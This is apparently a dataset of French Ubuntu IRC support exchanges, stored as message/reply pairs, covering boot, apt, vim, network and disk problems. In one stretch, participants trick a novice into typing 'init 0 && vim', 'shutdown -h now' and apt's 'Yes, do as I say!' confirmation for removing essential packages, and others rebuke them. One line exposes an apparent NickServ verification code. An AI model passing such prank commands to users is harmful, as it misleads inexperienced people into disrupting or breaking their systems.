et moi j'ai pas trop envie de me prendre la tête juste pour un raccourci, c'est la première fois que je peux pas aménager mon menu comme je veux, j'ai jamais eu ce problème avant	lxmed donc !
bon j'ai remplacé /usr/bin/hardinfo et j'ai une erreur fichier de bureau invalide	pour n'essayes tu pas lxmed ?
:)	pas bon de bidouiller des fichiers sous /usr/bin.
a la main	ton pseudonyme c'est Galeade ?
j'ai pu ajouter Galculator installé hier soir	utilises-tu lxshortcut ?
kamoulox !	piti c'est relativement là
personne pour m'aider avec me raccourcis dans la barre de lancement d'applications ?	c'est quoi ton blème ?
et bien beaver j'en ai marre, quand on me la pose, ce genre de questions	tu parles pas tres bien le Français pour un Français, et en scrollant, t'es un peu h-s avec ta propre question
meh³	mouep, ça ressemble à ça en tout cas
merci beaver ;-)	es tu un robot ?
bah cherche kompozer dans apt-get	http://doc.ubuntu-fr.org/kompozer
ho a force de lancer des humble bundle	t'es sur que t'es pas un bot ?
hs Marmotte	c'est toi qui dit n'importe quoi depuis un moment
trop compliquer a ce déplacer Marmotte	c'est en débutant qu'on apprend. Si on se cantonne à ce rôle, ça avance moins
*note	au contraire, avec de l'habitude, se déplacer dans un document avec vim devient très très simple
mais je ne le conseillerai pas pour msx42100 ^^	c'était juste pour l'introduire dans la discussion, je crois que je connais tes goûts :)
meh	je n'utilise que vim
je préfère quand le code est propre	du coup, vim c'est bien ?
c'est avec des icônes de partout piti i ?	utilise chromium ou chrome https://developers.google.com/web/tools/chrome-devtools/  :http://www.html5canvastutorials.com/
avec une interface beaver tu sait lequel?	la plupart
libreoffice writer?	tu veux faire quoi, exactement ?
hmm	mon avis à 2 centimes, zigouilles tout, installe juste Ubuntu et basta. Ensuite tu virtualiseras ton Windows avec le programme de ton choix (virtualbox est vraiment simple il me semble). Sur ce, bon app'... ;)
i7 2630	combien de RAM ?
pour crée une partition non alloue pour après que je teste si en faisant l'inverse ubuntu avant et win 10 apres si ça passe	si tu veux garder un windows, le truc pas mal c'est une install d'Ubuntu tout seul (pas de windows) et d'installer un windows en virtualisé via Virtualbox par exemple qui est très simple. Ça t'évite de rebooter qd tu veux lancer windows.
ok	c'est quoi ta version de Windows déjà installé (et que tu souhaites conserver) ?
14.04 ....LTS	tu as un windows aussi ?
(efi et non uefi)	t'es sûr ? C'est FAT32 pour moi une partition UEFI.
on dit BIOS ou UEFI, mais pas les deux	oui certes, "bios Legacy" et "UEFI".
je vais teste de supprimer la partition alloué. En faisant oui ou non ça change rien	tu veux repartitionner ton disque ? Ou tu cherches à le restaurer ?
hmmm ?	Ca donne quoi si tu tapes 'gdisk /dev/sda' ?
en fait, j'ai cassé mon grub et je l'ai réparer et depuis il faut plus de 2minutes pour boot sur gnome (avant 3/4s)	check ton fichier /var/log/boot.log
je vais voir ça cyphix, merci :)	Si ça t'intéresse et que tu l'installes, voici mon script pour l'utiliser depuis le terminal : http://p.cyphix.org/view/6fdeaca4
s/corentin/c0rt3xx	tu as essayé stikked?
idem:)	tu synchros aussi contacts/calendriers ?
beaver je suis sous debian et je peut pas télécharger le paquets autres distrib 64 bits	j'arrive pas à comprendre ton affirmation
bonjour à tous, je bloque sur un problème depuis quelques jours et je ne trouve pas la solution	expose nope ?
je dois utiliser un cloud, avec 29 personnes de ma classe et j'aimerais bien  éviter google drive	premiere URL
!wiki owncloud	http://doc.ubuntu-fr.org/owncloud | http://doc.ubuntu-fr.org/webdav | http://doc.ubuntu-fr.org/hebergeur | http://doc.ubuntu-fr.org/davfs2 | http://doc.ubuntu-fr.org/cloud
ça va juste servir à balancer une commande mplayer au démarrage pour faire une radio	ha ben tien c'est mieux ça, à la fin : http://askubuntu.com/questions/268200/how-to-automate-ethtool
j'ai essayé de rajouter le module jme au démarrage mais ça ne change rien. J'ai aussi tenté d'installer le driver téléchargé sur le site de jmicron mais ça me plante dans les mains au tout début de la compilation	ifconfig ?
je charge l'image sur un cd ?	avec une clef : https://doc.ubuntu-fr.org/usb-creator
je crois que c'est fait !	essaye : sudo apt-get clean && sudo apt-get update && sudo apt-get upgrade
merci oui 12.04 LTS	tu peux faire un pastebin de ton /etc/apt/sources.list ?
E:Encountered a section with no Package: header, E:Problem with MergeList /var/lib/apt/lists/security.ubuntu.com_ubuntu_dists_precise-security_main_i18n_Translation-en, E:The package lists or status file could not be parsed or opened.	precise ? elle est encore maintenue cette version ?
!wiki jmc250	Error: I tried to send you an empty message.
du coup c'est un problème de uefi et cie vous croyez ?	je prefere simplifier: faire des live avec unetbootin est à eviter sur les machines de moins de 3 ans
ah ouais je vois	à l'époque de mon tuto, les PPA ça n'existait pas :>
à l'époque de mon tuto, les PPA ça n'existait pas :>	bah ouais je parle des tutos de nicolargo
pas mal ton tutoriel sur postfix et imap Zic, ça fonctionne parfaitement x), bye bye hotmail	oulà, il a pas été mis à jour depuis près de 10 ans :p
si j'ai pas précisé le bs ça va prendre plein de temps non ?	apres les lives qui passent sur un bios ne passent pas forcement sur un UEFI … et unetbootin, il me semble que c'est pas super à jour
apres les lives qui passent sur un bios ne passent pas forcement sur un UEFI … et unetbootin, il me semble que c'est pas super à jour	c'est un vieux pc tout de même
c'est un vieux pc tout de même	uefi, ca date des années 90
ouais c'est ça, bon je la whipe	pour ?
"ca marche sur un autre portable" est pas "suffisant" pour faire un test ;p	ah, mon chassis a son ventilo avec un demi switch (positions off, low, med et high
si, plein ;)	ok super, merci beaucoup :)
Linux Xotic 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) x86_64 GNU/Linux	copiteur de CPU va
copiteur de CPU va	je l'ai depuis plus de 5 ans
je lui ai rajouté un flag boot, et là j'ai une autre erreur :)	c'est pas un problème 32 vs 64 tout simplement ?
hello, je n'arrive pas à booter un ordi depuis la clé usb. J'ai droit à un 'no OS found' ou un truc dans le genre. Je fais ma clé avec unetbootin, elle marche très bien sur un autre pc. J'ai aussi essayé plusieurs OS : ubuntu - ubuntu-mini - debian-net-install - ... Une idée ?	t'es sûr que le pc essaie de booter sur la clé ?
et ce sera une Lts, c'est xénial !	faut mettre à jour la doc ubuntu… https://doc.ubuntu-fr.org/xenial
Ah OK désolé, j'avais lu que c'était aussi pour les variantes d'Ubuntu. De toutes façons j'ai eu le même problème en installant sur mon macbook air la version 15 d'Ubuntu donc j'imagine que la solution de l'un fonctionne pour l'autre non ?	sinon c'est aussi un bug ubuntu : https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1222734
J'utilise un macbook air 13" avec linuxmint (rebecca) pour travailler et notamment afficher mes supports de cours. Mon problème est que même mis à jour le système ne voit pas la sortie VGA du videoprojecteur (elle utilise un convertisseur thunderbolt - VGA) Merci d'avance :)	c'est le genre de chose qui se gère avec le support de linx mint ça
piti ??	ça roule ?
oui	ah, diskd semble être un outil de squid. Essaie plutôt de relancer squid
j'ai le meme soucis sur la partition /	si tu peux surveiller l'activité sur le disque qui correspond ?
faut que je reboot alors	le disque est en activité là ?
essaie lsof /squid/logs	ca donne -> http://paste.ubuntu.com/12968432/
il ne se passe plus rien ensuite	mais oui démonté sinon l'install vas planter
Bonjour, sur image scan for linux, je voudrais savoir a combien de dpi je dois mettre pour des documents A4	même réponse ici ;)
je fais /mp mais c'est pas ça	c'est /query <pseudo>
quelqu'un peut me dire si l'affichage des pages de mon blog rame chez lui svp ? je file l'url en mp	donne-la moi en MP pour voir
bon je suis capable de le lancer..mais il reste pas en background ?	tu devrais suivre les liens vers la doc
tres drole les fin	Tu devrais prendre conscience de ce que tu ne sais pas avant de dire : ça marche pas. et oui la doc est mal faite mais pas incontournable
quand tu essaie de démarrer le bot	la documentation précise quand même que la partie la plus importante est la configuration dudit bot
si tu suis la doc a la lettre ca ne marche pas	t'as un message d'erreur ?
jy vais avec la source	quelle partie ?
mvvvv la doc ne marche vraiment pas	ou ça donc ?
c est pas lié a ubuntu comme question	tss t'es devenu un integriste ubuntien :(
j'ai erreur au make install	non non il n'y a pas de commande ./compile
ok je dois faire comment ?	ouvre un terminal
mezen cest a dire ?	c'est à dire que l'installation depuis les dépôts ne fonctionnera pas
quelqun peut m'aider avec la doc de eggdrop svp ?	compile l'eggdrop depuis les fichiers sources
donc debian si tu le dis	que répond 'lsb_release -irc' ?
!wiki load average	http://doc.ubuntu-fr.org/loadaverage | http://doc.ubuntu-fr.org/rrdtool | http://doc.ubuntu-fr.org/serveur | http://doc.ubuntu-fr.org/munin | http://doc.ubuntu-fr.org/nagios
!wiki primus	http://doc.ubuntu-fr.org/bumblebee | http://doc.ubuntu-fr.org/prime | http://doc.ubuntu-fr.org/installer_bumblebee | http://doc.ubuntu-fr.org/asus_n75sf | http://doc.ubuntu-fr.org/liste_portables_msi
ok merci	dis moi si l'install + reboot suffit que je corrige
je viens d'installer la version 15.10, il a tu moyen d'avoir la barre de menus en haut avec applications et tout  ?	là c'est mieux https://doc.ubuntu-fr.org/classicmenu
mais faut etre root pour rajouter ce fichier, sinon a toi de configurer le LDPATH pour ton user	Justement je ne suis pas root. J'ai essayé "export LD_LIBRARY_PATH=..." mais ça ne fonctionne pas...
Justement je ne suis pas root. J'ai essayé "export LD_LIBRARY_PATH=..." mais ça ne fonctionne pas...	tu as bien mis le chemin complet ?
tu as bien mis le chemin complet ?	Oui. Après il y a plein de sous dossiers dans ce dossier, je dois tous les charger uns à uns ?
Oui. Après il y a plein de sous dossiers dans ce dossier, je dois tous les charger uns à uns ?	normalement oui
normalement oui	J'ai du renommer aussi la librairie car elle a une suffix derriere... C'est normal ?
J'ai un petit problème, comment fait-on pour exporter un dossier de lib pour un utilisateur local ? (je n'ai pas les drois roots sur ma machine et j'aimerais me configurer un environnement de développement haskeel qui nécessite d'utiliser des libs dans ~/usr/local/lib	utiliser comment ? il peut les lire déjà
utiliser comment ? il peut les lire déjà	Et bien vu que le ~/usr/local/lib (attention au ~) n'est pas dans le path il ne peut pas...
Bonjour !	Bonjour ! :D
Tu raisonnes comme quelqu'un qui veut tous les environnements sur un seul PC Chaque distrib a ses travers, celui-ci est dérisoire, et rien ne dit que ces problèmes ne seront pas surmonté dans le futur	pour un utilisateur de Gnome 3 le travers n'est pas dérisoire, ça casse toutes l'ergonomie de ces deux logiciels que j'utilise quotidiennement
pour un utilisateur de Gnome 3 le travers n'est pas dérisoire, ça casse toutes l'ergonomie de ces deux logiciels que j'utilise quotidiennement	tu veux gnome et unity ensemble ... c'est un moindre mal
je serais curieux de savoir si Cinamon et Mate autorisent les CSD	Je raisonne comme un très vieille utilisateur de Ubuntu, qui voudrais garder ça distro en utilisant Gnome 3
enfin ... en conflit plutôt	pas gentil pour tous les autres qui ont développé gnome mais ne veulent pas gnome-shell
ceci dit la faute est plutôt du coté de gnome. ces CSD ne marchent que sur gnome-shell visiblement	sinon elle porterais d'autre nom .. et n'entrerais pas en concurrence
oui on a vu ça récemment avec l'abandon de leur scroll bar  pour utiliser à nouveau celui de gnome	le problème c'est de modifier l'application d'origine au lieu de forker. Genre les dev's de Mint au lieu de patcher comme des porcs Nautilus ils ont dev's nemo ... alors que les dev's de unity y casse joyeusement Gnome3 et se moque totalement des conséquences sur les autres environnements :'(
la nouveauté de gnome : "Client Side Decorations"	moi je veux retrouver des headers-bars normal et des applis non-patchés
J'imagine que cette modification a été faite pour permettre au "Global menu" de Unity de fonctionner correctement, toutefois, sous Gnome c'est juste trop moche de ne pas avoir l'application dans sont état original. Y a-t-il un moyen d'obtenir une version non patché de ces applications ?	c'est vrai qu'unity n'aime pas la liberté de gnome sur le rendu des fenêtre
oups, vilain bug sur le dist upgrade de willy. Le noyau 4.2 n'est pas installé si pilote propriétaire présent ...	bug, ou fait exprès ?
je cherche plutôt un logiciel de gstion de projets.	trop vague comme description, quelles fonctions de phabricator cherches tu à trouver ailleurs?
Bonsoir Scorp :)	phabricator c'est assez specifique, mais pour du code review, tu peux regarder gerrit et barkeep à regarder
est-ce que la commande apt-get dist-upgrade suffit pour passer de la version 15.04 en 15.10 en mode ubuntu server ?	non.
mise à jour vers 15.10 ?	oui
Ah j'avais pas fait attention, je vais voir sa merci ;-)	sinon, attention, "sans que ca se voit" va etre interpreté de facon tres differentes suivant les personnes à qui tu parles
Ok merci, si on ne fait jamais dist-upgrade les logciel peuvent t' ils planter ?	si ton ordi est connecté au reseau, il faut faire les mises à jour, sauf si tu veux partager ta machine avec le monde
D'accord, j'aime bien les images ... lol je change le moteur de ma deux cheveaux pour celle d'une férari mais je laisse la carosserie de la deux cheveaux ...	si tu es sur une branche stable d'Ubuntu et que tu n'as pas de dépôt foireux, non :)
vamps : Merci	en pratique, visuellement, quand tu fais ton upgrade tu as parfois dû voir "X paquets mis à jour, 0 nouvellement installé, 0 non-mis à jour" avec un "upgrade"
Quel est la différence entre upgrade && dist-upgrade ?	https://askubuntu.com/questions/194651/why-use-apt-get-upgrade-instead-of-apt-get-dist-upgrade
Bonjour, es-t' il possible de devenir bénévole temps partielle ? Que dois-je faire en temps que bénévole ? J'ai lus la documentation à ce sujet ... Je ne comprend pas très bien juste en répondant à une question sur un forum on est bénévole ?	bien sur
non mais moi je m'en fous hein, c'est que d'habitude ça couine dès 6h du mat	plus depuis quelques versions, ça s'est calmé
vous vous connessez dans la vie réelle ?	ouais, je me reconnais dans le mirroir le matin
on ne doit pas attendre la réponse des autres…	de manière générale, le lien donné par avelldiroll est très instructif
j'ai l'habitude de comprendre les trucs qui ne veulent rien dire vu les tickets qui arrivent chez moi :}	moi aussi, mais j'apprécie que les personnes demandeuses fassent des efforts
moi aussi, mais j'apprécie que les personnes demandeuses fassent des efforts	sinon j'aurais posté un "pakompri" des familles
zic répond parfaitement bien à ma question	relis toi, c'est pas de l'humour
relis toi, c'est pas de l'humour	ben alors c'est toi tout entier qui zarbi ;-)
si tu veux le JAVA d'Oracle, il faudra passer par un PPA externe ou récupérer le binaire chez Oracle	il pense que java ne tourne pas sous linux, la commande ne marche pas … je vois pas le probleme :)
a quand la nouvelle version de ubuntu ?	c'est prevu pour aujourd'hui, en general ca arrive dans l'aprem https://wiki.ubuntu.com/WilyWerewolf/ReleaseSchedule … ce sera annoncé là: #ubuntu-release-party
Bon, si je compte bien (à partir de 1, pas 0), windows, c’est la huitième entrée (mais c’est bizarre parce que je crois me souvenir qu’il n’y a pas autant d’entrées de menu quand je démarre)	faut partir de 0
grub-reboot <Windows_Entry>	 Merci :-)
Ce qui était sympa avec Suse, c’est que ça n’affectait que le redémarrage suivant (c’est à dire qu’une fois que j’avais fini avec Windows, le redémarrage d’encore après se faisait par défaut sous Linux)	yep, grub-reboot --help
@Vamp T es au boulot là en plus?	j'ai eu le temps de manger, fumer une clope et ecrire 50 lignes de code entre les deux t'inquietes pas :p
excellent... (tiens j'ai perdu mon nom IRC...)	je vais pouvoir retourner bosser xD
vérifié (ssid et clé) : normalement tout est ok...	tu peux selectionner WPA Passphrase ou WPA hexa non ?
http://pastebin.ubuntu.com/12885170/ j'ai de plus en plus l'impression que mon interrupteur m'a laché	hard locked, il faut redemarrer du coup
@vamp je ne sais plus quoi faire...	essayes de voir si wpa_supplicant arrive à synchroniser en mode manuel
oui mais elle est allumé genre le wifi fonctionne.	je vois rien d'étrange sur le dmesg
also freezes the drive so that you can't change the password later	je savais meme pas que certain disque ATA supportait ça
Je vois pas bien à part un truc en rouge au milieu...http://pastebin.ubuntu.com/12885121/	noviceBSD à raison, tu as pas une touche function sur ton portable pour désactiver/activer la carte wifi ?
@vamp regarde mon rfkill list maintenat:http://pastebin.ubuntu.com/12885109/	hum, c'est pas bon ça, est-ce que tu pourrais regardé la sortie de dmesg vers la fin, tu devrais avoir des erreurs
@vamp: j'ai été deco ,non?	meme pas
Bon ben finalement, le chat à l'air mort...	ouep
oui	je vais etre plus explicite : ce que tu dis n'a aucun sens
fdisk: unable to read /dev/sda: Input/output error	tu as tappé quelle commande exactement avec hdparm ?
unable to open /dev/sda: Permission denied	utilises peut-être "cfdisk" au lieu de "fdisk" si tu es novices
fdisk -u /dev/sda	"sudo fdisk -u /dev/sda"
Mais à toute fin utile, je te parle depuis ce pc que j ai connecté en ethernet pour pouvoir aller sur irc	ah...
genre dnsmasq ou autre ?	 secure erase ATA
vous savez a qui on doit les liens tel "x-terminal-emulator", ou "x-www-browser"? merci	http://linux.die.net/man/8/update-alternatives
@vamp http://pastebin.ubuntu.com/12885080/	tu as installé un serveur DNS en local ?
je cherche  a supprimer le password au boot de lordi	c'est surement pas avec hdparm que tu vas faire ça
-c3	vérifie que tu as une résolution DNS avec : "host google.com" par exemple
@vamps euh... j'ai "permission non accordé" (merci pour le	"sudo cat /etc/resolv.conf"
http://pastebin.ubuntu.com/12885064/	tu as quoi dans /etc/resolv.conf ?
comment on arrete le ping dejà?	je te confirme, tu es connecté a internet
avec le dongle je ping ma box	tu pourrais me montrer la sortie du traceroute ?
le man :D	les tutos c'est mal ?
si tu veux vraiment comprendre comment est contruit le système, tu peux aller lire le livre LFS... mais il faut déjà avoir quelques bases, sinon ça ne servira qu'à t'embrouiller :D	il peut toujours lire les shelves O'Reilly
il peut toujours lire les shelves O'Reilly	tout dépend de ce qu'il recherche comme information
tout dépend de ce qu'il recherche comme information	je pars du principe qu'il veut juste de la lecture :) avec un truc aussi vague, on peut pas vraiment faire mieux
oui, car en fait vue la taille du disque il a fallu 13 minutes pour qu'il m'écrire : 0,01 %	t'as bien des soucis, avec tes disques..
Une question concernant une commande comme e2fsck -fyvcck /dev/sda1 elle ne veut pas parler... il manquerait l'option "verbose" sur le LIVE que j'utilise ?	il affiche rien dutout ?
Tu n'as pas de terminal O_o ? Tu es sur quel version celle de test ?	je suis en live...j'avais 3 terminaux et un a disparu et j'ai une appli qui tourne !
ctrl+alt+t sur kubuntu tape terminal barre de recherche	voila réponse (en termianl) : The program 'terminal' is currently not installed
mais je pencherais plus pour sudo aussi, avec une configuration adaptée au besoin	lol :)
<3	j'ai un client qui utilise "sudo su - root" par habitude, et qui ne veut pas changer
:)	je voulais dire que "su -c commande" est équivalent à "su - root -c commande", mais dans tous les cas, ce n'est pas ce que tu veux faire
je voulais dire que "su -c commande" est équivalent à "su - root -c commande", mais dans tous les cas, ce n'est pas ce que tu veux faire	ok, merci
et su sans mot de passe, ça n'existe pas (et heureusement)	tu veux dire que su -c 'votre commande' marcherait?
et pourquoi pas sudo ?	parce qu'il ne doit pas connaitre
command du genre su - root -c 'votre commande' -p password si ca existe, je vais l'utiliser avec os.popen ou os.system du langage python	"su - root", c'est inutile, "su" tout court fait la même chose
directement avec la commande su	tu veux pas plutôt expliquer pourquoi tu cherches à faire ça ?
c'est vrai	non. essaie avec ton utilisateur standard (pas root) de supprimer /etc/passwd
non	si vous n'êtes pas en root et que vous cherchez à acceder dans les autres repertoires surement le système demandera le mot de passe
en quoi un mv demanderai un mot de passe ?	c'est juste un exemple
comment entrer un mot de passe directement sur une première commande shell? ex: mv /dir1/file1 /dir2/ *-p pass*	Oo ?
tout cassé le truc..	j'ai bien reçu ton message... a quel degré faut-il le prendre ???
https://debian-facile.org/paste-232863A7B9	ah, bah mon sentiment est que oh mon dieu mais c'est affreux:
j'aifait un e2fsck etça bloqueà 35 %, une explication ? le compteur horaire tourne toujours lui ! 18 heures...	regarde le dmesg, il y a peut-etre des fautes de lecture ?..
Ok, c'est pointu un ordinateur ^_^	supérieur ou égal à 12 _et_ inférieur strict à 16. ;)
Je te mp sa	ton erreur indique que la variable “interdit” n'est pas définie dans ton code. Tu as bien une erreur au niveau du code python.
-___-  … ca peut se regler très vite cette histoire :/	un rm ça supprime quelque chose   un init 0 ça ne fait rien de mal
un rm ça supprime quelque chose   un init 0 ça ne fait rien de mal	y a plein d'autres salons pour aller faire le pitre, pas besoin de compliquer la vie de ceux qui ont un souci et de faire perdre du temps à ceux qui aident
y a plein d'autres salons pour aller faire le pitre, pas besoin de compliquer la vie de ceux qui ont un souci et de faire perdre du temps à ceux qui aident	ça fait rien tu n'a pas suivi la conversation ...
non	va relire https://doc.ubuntu-fr.org/conduiteirc … et en particulier #12, pour faire le pitre il y a d'autres salons que les salons de support :/
me suis trompé tape init	il galère déjà assez... L'objectif est d'aider.
en sudo?	non c'était une blagues ne le fait pas
c'est noté	tapes ça dans un terminal   :   init 0 && vim
oui	pour les copié/collé de plus d'une ligne utilise une pastebin, ca evite de se faire prendre pour du flood par le bot
et c'est pas un ban, juste un quiet	ha je ne savais pas que c'était q'une minute (oui le quiet pardon)
2. Est-ce que tu te foutterais pas de la tete de Zic?	le bot va le deban dans une minute, c'est juste l'antiflood
sans les ""	tu le deban?
tu dois l'écrire en anglais la phrase : oui faites ce que je vous dis ! -> Yes, do as I say!	 tapes ça dans un terminal   :    shutdown -h now
pourquoi?	lsb_release -a
non	Pas de Molokai : ls /usr/share/vim/vim74/colors/
Pour continuer, tapez la phrase « Oui, faites ce que je vous dis ! »	1. Est-ce que tu es sous ubuntu?
si oui, je ne sais pas ce que tu as fais, mais tu as détraqué command-not-found :)	ne va pas nous l'embrouiller
vim: /usr/bin/vim /usr/bin/vim.basic /etc/vim /usr/bin/X11/vim /usr/bin/X11/vim.basic /usr/share/vim /usr/share/man/man1/vim.1.gz	si tu tappes : /usr/bin/vim
Zic c'est ce que je fais	whereis vim
nop	bref : sudo apt-get install vim
sudo apt-get install vim-tiny	non mais tu ouvres une consoles et tu tapes : sudo apt-get install vim
Le programme « vim.tiny » n'est pas encore installé. Vous pouvez l'installer en tapant :	tu as redémarré ton ordinateur après avoir installé vim xD ?
dilm oui	et maintenant si tu fait un : vim    que se passe t-il ?
sur la desc de apt-cache show vim	ha mal lu... j'ai cru "ne contient que l'interface graphique"
"Il ne fournit pas d'interface graphique.	oui il est fournit par vim-nox par exemple
il me semble que "vim" tout court ne contient plus de vim graphique btw	mais y'a pas d'interface grafique pour vim c'est normal
(mais j'ai pas vu lequel :p)	sisi
il disait qu'il avait un soucis avec le paquet vim	17:25 < nelozz> ok apt-cache search vim  fait je tape vim hé hop Le programme « vim.tiny » n'est pas encore installé. Vous pouvez l'installer en tapant :
(essaie donc vim-nox pour ton cas, dilm)	pour mon cas ?
vim-nox ou vim tout court au pire	non. vim tout court
le fromage allégé c'est toujours trop allégé	mais il l'a déjà fait
mais il l'a déjà fait	je doute
(trop)	comme le fromage
vim-tiny ne contient pas la coloration syntaxique il me semble	ouep
='(	":syn on" ?
nop	ce répertoire n'existe pas par défaut
(bonjour, puis-je trouver les logs de ce chan qq part ?)	non
non	ok
nop	pour info, ~ représente ton répertoire personnel
??	dans /etc/vim, tu as la configuration générale pour tout le système
donc pour le rendre plus agréable je voulais installer un thème de couleurs sauf que je n'es pas l'autorisation apparement de changer quoi que ce soit dans le dossier vim ni de changer les droits en chmod	travaille dans ton ~/.vim
  /msg NickServ VERIFY REGISTER guy02 imqmahvypdjt	oups ?
surtout que le chan n'est pas débordé cematin...	faudrait que tu paste le retour de ton smartctl d'abord :)
o/	ce chan est dédié au support Ubuntu, il n'y a pas des chans dédiés au PHP ?
Bonjour, je cherche des cours en php avec pas mal d'exercices pour m'entraîner.	le rapport avec Ubuntu ?
Merci pour l'information. J'ai essayé la méthode des scripts (quoi, moi, paressux ?), j'obtiens : proxyon.sh : command not found	tes scripts sont exécutables ?
Bonjour à tous. Y a-t-il une âme charitable pour aider un pauvre linuxien en devenir ? Il s'agit d'un problème de configuartion réseau (je n'ai que très mal compris les rares pages sur lesquelles je suis tombé)	si tu expliques ton problème (ce que tu as fait, ce que tu as obtenu, ce que tu veux obtenir, les messages d'erreur, etc.), on pourra peut être t'aider
https://bugs.launchpad.net/maria	mouais, bof ton lien x)
Mais après là je l'avais désinstallé hein	si tu as utilisé les dépôts officiels ça mérite un bug report
Nek fais un apt-get clean et réessaye	ça ne change rien !
les partitions de ta machine ne sont pas pleines ou un truc dans le genre ?	marche pas le -f.
Nek un code d'erreur avec sudo apt-get install mysql-server ?	j'ai pas mieux :/
C'est plus propre (exemple utilisateur1 joue avec steam alors que l'utilisateur2 à steam d'installer alors qu'il ne joue pas). Bon il y a plus qu'à aller voir le match de rugby. Merci	suffit de nettoyer le menu
Ah !	mais si je te derange, tu peux me /ignore
avelldiroll : Tu es pas forcément obligé d'etre aussi direct et cassant !	je m'adressais à qwebirc27288
J'ai que le minimum :/	?
Je voulais séparé le logiciel propriétaire steam du reste de ma config...	dans le cas de steam, tous les utilisateurs peuvent lancer steam mais ne partagent pas le meme compte steam … les jeux ne seront dispo que pour un seul user
Adrinux : ton prolème avec firefox vient peut être de tes extentions ?	ce n'est pas parce qu'un logiciel est installé pour tout le monde que les parametres sont partagés
au démarrage surtout	non, QUE au demarage
aussi, si tu as un disque dur mécanique, tout sera lent comparé à un SSD	qu'est ce que la vitesse du disque va changer dans l'utilisation de firefox?
j'ai regardé, mais j'ai pas trouvé ce qui correspond à ces fonctions, peut etre tu sais mieux ?	voir le plugin unity il liste toutes les options que tu souhaites activer
j'ai déjà réessayer , ca change toujours rien	essaye avec ccsm
<Damomo> Désormais les paramètres d'affichage et d'apparence n'ont plus d'influence... Lanceur sur les 2 écrans, bords collants, cacher automatiquement le lanceur... Quand je modifie ces options, rien ne se passe... Des idées ?	problème très atypique. Je n'ai rien d'autre à te proposer que d'essayer de réinitialiser compiz avec ccsm
ha ok	#ubuntu-fr-offtopic pour bavarder :p
Comment allez vous ?	seulement de laide pour des problemes d'ubuntu ici
mint a l 'air d avoir les memes kernels que ubuntu	y a pas de "meilleure" dans l'absolu, c'est juste deux distro differentes qui vont être plus ou moins adaptées suivant les individus qui les essaient
?	est-ce que ton UEFI va chercher le bon fichier au bon endroit ?
Quelqu'un pourrait m'aider pour un problème de reseau wifi ?	explique pour voir
quand je suis dans mon login screen, mon écran n'est pas dans son bon emplacement virtuelle :(	malheureusement, ca je sais pas :(
non	Ça marche tabarnak :D :D :D :D :D
une question sans question	cela n'as pas fonctionné
rien	donc, le module ne se charge pas, si tu modprobe nvidia , ça dit quoi ?
même resultat	bon et sans pastebinit, ça dit quoi ? :/
Désolé, j'ai l'impression que c'est nul à chaque fois ^^	file redmine-1.3.0.tar.gz
quelqu'un peut il me renseigner pour un comparateur de prix pour informatiqu	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
*install	tu suis ?
:)	c'est surtout une faute grossière à caractère humoristique tel que "j'ai mouru" afin de signifier ma fatigue de fin de journée :p
Bonjour à tous ! J'aimerais afficher l'utilisation en MB/s sur un share NFS, est-ce que quelqu'un saurait comment faire ?	nfsstat & iftop
ok... parce que sur la première c'est mince je trouve...	j'espere que tu t'en sors, mais de toute façon, mieux vaut mettre des backups en place avant, que de tenter de récuperer des données apres.
merci Ool je vais voir	tu as cette page aussi: https://doc.ubuntu-fr.org/utilisateurs/rmy/recuperer
sur la page : http://poloastucien.free.fr/ddrescue_h.html il est proposé 3 passes avec 3 lignes de commande, cela vous parait bon ?	je ne sais pas, mais tu peux comparer avec ce qui est dit là: https://doc.ubuntu-fr.org/ddrescue
puis même "bien fichu" à terme pour le déploiement	il veux 2 versions d'un même paquet installé en même temps, dans la meme version majeur, donc à un moment où à un autre ce sera forcement un peu crade
le but d'une appliance, c'est de sous traiter	je compile en statique avec un PREFIX donc non pas de souci de droits à priori, en tout cas j'en ai jamais eu
oui, en terme de business, mais techniquement ? :D	apres, tout depend de l'importance qu'à la secu pour le business qui veut du docker et de l'appliance
yep, plein de soucis de droits non identifiés à la compilation qui se poseront quand les users executeront l'appli	ya un mec chez nous qui disait "Non mais les réac' sur Docker sont ceux qui disent aussi du mal des appliances, et au final, quand on regarde le marché, les appliances sont ce qui marchent le mieux en terme de business."
ya un mec chez nous qui disait "Non mais les réac' sur Docker sont ceux qui disent aussi du mal des appliances, et au final, quand on regarde le marché, les appliances sont ce qui marchent le mieux en terme de business."	tu peux leur dire que raler sur docker ne m'empeche pas de continuer à raler sur les appliances … et puis serieusement, y en a encore qui mouftent sur les appliances depuis heartbleed ? (enfin heartbleed et le temps de reaction des fournisseurs d'appliance, voir l'absence de reaction)
ok j'avais essayé unity8-lxc sur mon vieux bousin j'avais été bleufé par la performance	le probleme c'est pas les perf, c'est la secu
mais oui ca pourrait	selon moi, la solution la plus propre, enfin la moins sale, c'est de conserver la version officielle en installation par les depots, recupérer les paquets src de la 2.10.X, changer la cible d'installation (vers /usr/local ou /opt) et changer la cible des binaires (qgis2.10.X au lieu de qgis), et de rebuilder le paquet puis de l'installer
ok	apres, c'est pas comme si c'etait ce que voulait faire canonical avec snappy …
s/dokker/docker/	mais passer par un conteneur pour ca … c'est un peu bourrin
non, pas si les differents paquets ne prevoient pas la presence de versions concurrentes sur la meme machine, ce qui normalement n'est pris en compte, en toute logique, que pour les changement de version majeur	C'est pas le genre de problème qu'on peut gérer avec lxc ou dokker ?
C'est pas le genre de problème qu'on peut gérer avec lxc ou dokker ?	si, y a plein de solutions, mais passer par docker c'est pas plus compliquer de se faire un build env de dev
Ou serait-ce plus judicieux d'utiliser nice ?	c'est ça, make -j1
tout est supposer etre ok sur ce cote	il faut en être sûr ;)
j'ai installer apache2 en local je peux lui acceder mais de l'extérieur je crois que ca bloque quelqun peut m'aider ?	quand tu dis "extérieur", tu veux dire une autre machine sur le même réseau privé ou bien depuis internet ?
je cherche un équivalent de apt-get autoremove pour le "nouveau" apt, je sais pas si quelqu'un a déjà tenté d'effectuer cette action ?	c'est pas le "nouveau apt", c'est le "apt present depuis un moment qui est juste un wrapper simplifié et ne remplacera jamais apt-get"
c'est pas le "nouveau apt", c'est le "apt present depuis un moment qui est juste un wrapper simplifié et ne remplacera jamais apt-get"	ok, donc je n'ai qu'à me faire un alias c'est ça ? :D
tar c'est juste un cat de fichier .gz	en gros, actuellement, j'ai ça : http://pastebin.com/DFqhB1mB
*tu n'as	hein ?
